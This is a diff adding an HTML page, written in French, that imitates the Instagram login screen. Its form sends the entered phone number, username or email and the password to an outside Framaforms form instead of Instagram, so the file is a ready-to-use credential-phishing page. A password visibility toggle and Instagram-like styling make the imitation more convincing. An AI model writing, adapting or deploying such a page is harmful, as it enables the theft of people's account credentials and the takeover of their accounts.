@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Connexion Instagram</title>
+<link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet" />
+<style>
+  body {
+    background: #000;
+    color: #fff;
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .container {
+    background: #121212;
+    padding: 30px;
+    border-radius: 8px;
+    width: 320px;
+    box-sizing: border-box;
+  }
+  h1 {
+    font-family: 'Pacifico', cursive;
+    font-size: 40px;
+    margin: 0 0 20px 0;
+    text-align: center;
+  }
+  label {
+    display: block;
+    margin: 12px 0 6px;
+    font-size: 14px;
+  }
+  input[type="text"],
+  input[type="password"] {
+    width: 100%;
+    padding: 10px;
+    background: #222;
+    border: 1px solid #444;
+    border-radius: 4px;
+    color: #fff;
+    font-size: 14px;
+  }
+  .password-wrapper {
+    position: relative;
+  }
+  .toggle-password {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    width: 22px;
+    height: 22px;
+    fill: #aaa;
+  }
+  button {
+    width: 100%;
+    margin-top: 20px;
+    padding: 10px;
+    background: #3897f0;
+    border: none;
+    border-radius: 4px;
+    color: white;
+    font-weight: bold;
+    font-size: 16px;
+    cursor: pointer;
+  }
+  .facebook-btn {
+    background: #1877f2;
+    margin-bottom: 15px;
+  }
+  .signup {
+    text-align: center;
+    margin-top: 15px;
+    font-size: 14px;
+    color: #aaa;
+  }
+  .signup a {
+    color: #3897f0;
+    text-decoration: none;
+    font-weight: bold;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h1>Instagram</h1>
+
+  <form action="https://framaforms.org/connexion-instagram-1752775137" method="POST" target="_blank" autocomplete="off">
+    <button type="button" class="facebook-btn">Connexion avec Facebook</button>
+
+    <label for="username">Téléphone, nom d’utilisateur ou email *</label>
+    <input type="text" id="username" name="new_1752775215051" required />
+
+    <label for="password">Mot de passe *</label>
+    <div class="password-wrapper">
+      <input type="password" id="password" name="new_1752775407266" required />
+      <svg class="toggle-password" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-label="Afficher le mot de passe" role="img" tabindex="0">
+        <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
+        <circle cx="12" cy="12" r="2.5"/>
+      </svg>
+    </div>
+
+    <button type="submit">Se connecter</button>
+  </form>
+
+  <div class="signup">
+    Pas de compte ? <a href="#">Inscrivez-vous</a>
+  </div>
+</div>
+
+<script>
+  const togglePassword = document.querySelector('.toggle-password');
+  const passwordInput = document.getElementById('password');
+
+  togglePassword.addEventListener('click', () => {
+    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+    passwordInput.setAttribute('type', type);
+
+    if(type === 'text') {
+      togglePassword.style.fill = '#3897f0';
+    } else {
+      togglePassword.style.fill = '#aaa';
+    }
+  });
+</script>
+
+</body>
+</html>
